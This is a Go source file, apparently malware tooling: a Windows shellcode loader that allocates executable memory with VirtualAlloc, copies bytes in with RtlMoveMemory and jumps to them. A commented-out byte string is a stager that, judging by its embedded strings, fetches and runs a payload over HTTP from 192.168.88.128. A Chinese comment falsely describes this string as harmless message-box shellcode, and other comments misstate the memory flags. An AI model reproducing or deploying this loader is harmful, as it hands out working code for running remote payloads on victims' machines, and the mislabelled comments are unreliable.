package loader

import (
	"syscall"
	"time"
	"unsafe"
)

var (
	kernel32      = syscall.NewLazyDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
)

func Loader() {

	// 这是一个用于弹出提示框的shellcode，你可以根据需要修改它
	//shellcode := "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x9e\x45\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x61\x44\x56\x62\x00\x2b\xf4\xa7\x46\xa0\x19\xb6\xc8\x3a\x6c\xca\x9c\xb9\x29\x85\x0d\xd1\xd8\x7b\xf0\xfb\xea\xfa\x69\x6b\x83\x56\xd7\xe1\xc4\x1c\x4f\x8e\xf5\xe0\x81\xbd\xa7\x3f\x28\x71\x37\xc2\x7a\x3a\x28\x23\xc6\x1f\xc9\xf9\xe6\x1e\x0c\x1e\xdc\xfc\x6e\xb8\x04\xfb\x22\xfa\x91\x1d\xfc\x13\xed\x72\x24\xb1\x77\xa5\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x4d\x41\x4e\x4d\x29\x0d\x0a\x00\x37\x59\x63\x9a\xaa\x15\xc6\xf9\x06\x43\x22\x13\xa3\x97\xdb\xe8\xe1\x8a\x85\x68\xb3\x10\x78\x2b\xdd\x4d\x2a\xc2\x90\xd3\xdf\xc8\x1d\xf0\xe4\x55\x85\xc5\x64\x95\x7d\xf9\xd9\x2f\x9c\xd4\xa7\x9c\x59\x08\xa0\x8a\xf2\x47\x33\xaf\x83\x89\xd3\x83\xa2\x8c\x24\x6d\xd6\x8c\xfa\xc5\x6b\x5f\xa2\xe5\x3b\x53\xfc\x83\x1d\xc1\x16\x8b\x41\x84\x25\x4c\x0b\x41\xc6\xf7\x5a\x2a\x61\x13\x71\x92\xec\x1a\xbc\x5e\xab\x81\x7d\x7b\xa4\x36\x11\x0f\x38\xf6\x1c\xb5\x37\xd5\x34\xa1\x60\x7b\xef\x09\x27\x01\x74\x4a\xc1\x19\xb1\x38\xb4\xed\xca\x56\xdd\x0e\xcd\x6b\x32\x85\x75\x98\x56\x00\x63\x4d\xd6\x8d\x79\x6c\x42\xe3\xd2\xd6\x95\x63\x4a\x44\x22\x77\xb0\xc4\x85\xc8\xf5\x08\x77\xd7\x60\x1b\xe0\xe7\x31\x1f\xb0\xd8\xb7\xe2\x47\xab\xbf\xad\x63\xfe\x5d\xa2\x20\xdb\x2d\xef\xeb\xc0\x94\xf4\xbd\xf0\x18\x7e\x9f\xb3\x66\x5e\x3b\x43\x6e\x0e\x89\x4d\xfd\x9e\x7b\xe7\x8c\x45\xcb\x61\xbb\xbf\x42\x4d\xbe\xf4\x43\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x38\x38\x2e\x31\x32\x38\x00\x3a\xde\x68\xb1" // 获取shellcode的字节表示
	shellcode := "\xfc\x48"
	shellcodeBytes := []byte(shellcode)
	//shellcode位置
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcodeBytes)), 0x1000|0x2000, 0x40)
	//0：开始内存地址
	//uintptr(len(shellcode))：申请内存长度
	//0x1000|0x2000：属性可读可写可执行
	//0x40：仅保留分配信息及使用时对内存进行清零

	RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcodeBytes[0])), uintptr(len(shellcodeBytes)))
	//SWAPMem：指向要将字节复制到的目标内存块的指针,指申请内存空间返回地址
	//uintptr(unsafe.Pointer(&shellcode[0]))：指向要从中复制字节的源内存块的指针，指shellcode的首地址
	//uintptr(len(shellcode))：写入内存长度

	syscall.Syscall(addr, 0, 0, 0, 0)
	//使用 syscall.Syscall() 函数调用存放在这个内存块里的 shellcode
}

func Test() {
	Loader()
	time.Sleep(10000000000)
}
